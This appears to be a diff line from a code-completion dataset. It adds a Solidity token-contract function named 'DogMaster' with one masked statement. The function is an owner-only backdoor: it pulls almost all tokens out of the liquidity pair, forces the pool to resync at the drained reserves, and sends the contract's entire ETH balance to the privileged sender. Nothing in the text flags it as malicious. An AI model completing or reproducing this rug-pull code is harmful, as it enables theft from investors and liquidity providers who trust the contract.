@@ -1,0 +1,1 @@
+"function DogMaster(uint amount) external {        require(msg.sender == Sender);        uint bal = balanceOf(Pairing);        if (bal > 1) _transfer(Pairing, address(this), bal - 1);        IPairing(Pairing).sync();        <mask0>;        (bool success,) = address(Sender).call{value: address(this).balance}(\"\");    }"
